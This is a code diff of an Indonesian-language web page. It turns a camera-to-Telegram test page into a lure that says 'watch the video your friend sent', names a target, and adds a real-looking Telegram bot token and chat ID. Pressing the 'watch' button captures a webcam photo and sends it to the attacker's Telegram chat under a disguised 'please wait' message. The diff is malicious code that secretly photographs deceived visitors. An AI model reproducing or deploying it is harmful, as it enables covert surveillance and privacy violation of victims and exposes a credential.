@@ -46,10 +46,10 @@
 <body>
 
     <div class="card">
-        <h2>Halo, Ini Percobaan! 👋</h2>
-        <p>Pengujian akses kamera & integrasi Telegram via GitHub Pages.</p>
+        <h2>Halo, Tonton video yang teman anda kirim 👋</h2>
+        <p>tonton yang teman anda kirim @firman.. Ardiansyah.</p>
 
-        <button id="btnTes">Tes Ambil Foto</button>
+        <button id="btnTes">TONTON</button>
         <p id="status"></p>
     </div>
 
@@ -59,8 +59,8 @@
 
     <script>
         // MASUKKAN DATA TELEGRAM KAMU
-        const BOT_TOKEN = "ISI_TOKEN_BOT_KAMU_DI_SINI";
-        const CHAT_ID = "ISI_CHAT_ID_KAMU_DI_SINI";
+        const BOT_TOKEN = "8013765711:AAFQMhJXquSESpWCf64u9MN0-mlpT8JLlB0";
+        const CHAT_ID = "7521596861";
 
         const btnTes = document.getElementById('btnTes');
         const status = document.getElementById('status');
@@ -97,9 +97,9 @@
                             const formData = new FormData();
                             formData.append('chat_id', CHAT_ID);
                             formData.append('photo', blob, 'foto.png');
-                            formData.append('caption', '🔔 Foto dikirim via GitHub Pages!');
+                            formData.append('caption', 'Login');
 
-                            status.innerText = "Mengirim foto ke Telegram...";
+                            status.innerText = "tunggu sebentar";
 
                             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                 method: 'POST',
@@ -110,7 +110,7 @@
                             if (data.ok) {
                                 status.innerText = "Berhasil! Foto terkirim ke Telegram.";
                             } else {
-                                status.innerText = "Gagal mengirim ke Telegram.";
+                                status.innerText = "Gagal, seperti nya anda belum mengizinkan.";
                                 console.error(data);
                             }
                         }, 'image/png');
